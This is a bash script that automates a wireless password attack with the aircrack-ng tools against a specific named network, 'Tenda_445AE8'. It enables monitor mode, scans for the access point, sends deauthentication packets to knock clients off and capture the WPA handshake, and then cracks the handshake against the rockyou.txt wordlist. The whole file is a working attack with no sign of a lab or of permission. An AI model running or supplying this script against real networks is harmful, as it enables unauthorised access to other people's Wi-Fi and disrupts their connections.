#!/bin/bash

# Check if running as root
if [ "$(id -u)" -ne 0 ]; then
    echo "This script must be run as root!" >&2
    exit 1
fi

# Config
TARGET_SSID="Tenda_445AE8"
WORDLIST="/home/geto/Network/rockyou.txt"
INTERFACE="wlp1s0"  # Change to your wireless interface
MON_INTERFACE="${INTERFACE}mon"
CAPTURE_FILE="djaweb_capture"
HANDSHAKE_FILE="${CAPTURE_FILE}-01.cap"

# Kill interfering processes
echo "[+] Killing interfering processes..."
airmon-ng check kill &> /dev/null

# Enable monitor mode
echo "[+] Starting monitor mode on $INTERFACE..."
airmon-ng start $INTERFACE &> /dev/null

# Scan for target network
echo "[+] Scanning for $TARGET_SSID..."
airodump-ng $MON_INTERFACE --essid "$TARGET_SSID" -w $CAPTURE_FILE &> /dev/null &
SCAN_PID=$!

# Wait for target network detection (5 sec)
sleep 5
kill $SCAN_PID &> /dev/null

# Extract BSSID and Channel from capture
BSSID=$(awk -F',' "/$TARGET_SSID/ {print \$1}" ${CAPTURE_FILE}-01.csv | head -n 1 | tr -d ' ')
CHANNEL=$(awk -F',' "/$TARGET_SSID/ {print \$4}" ${CAPTURE_FILE}-01.csv | head -n 1 | tr -d ' ')

if [ -z "$BSSID" ]; then
    echo "[-] Error: $TARGET_SSID not found!"
    airmon-ng stop $MON_INTERFACE &> /dev/null
    exit 1
fi

echo "[+] Found $TARGET_SSID:"
echo "    BSSID: $BSSID"
echo "    Channel: $CHANNEL"

# Capture handshake
echo "[+] Starting handshake capture..."
airodump-ng -c $CHANNEL --bssid $BSSID -w $CAPTURE_FILE $MON_INTERFACE &> /dev/null &
DUMP_PID=$!

# Deauth attack to force handshake (5 packets)
echo "[+] Sending deauth packets..."
aireplay-ng -0 5 -a $BSSID $MON_INTERFACE &> /dev/null

# Wait for handshake (10 sec)
sleep 10
kill $DUMP_PID &> /dev/null

# Check if handshake captured
echo "[+] Checking for handshake..."
if aircrack-ng $HANDSHAKE_FILE | grep -q "WPA (1 handshake)"; then
    echo "[+] Handshake captured! Attempting crack..."
    aircrack-ng -w $WORDLIST $HANDSHAKE_FILE
else
    echo "[-] No handshake captured. Try again with more deauth packets."
fi

# Cleanup
echo "[+] Cleaning up..."
airmon-ng stop $MON_INTERFACE &> /dev/null
rm -f ${CAPTURE_FILE}-*.*
echo "[+] Done."
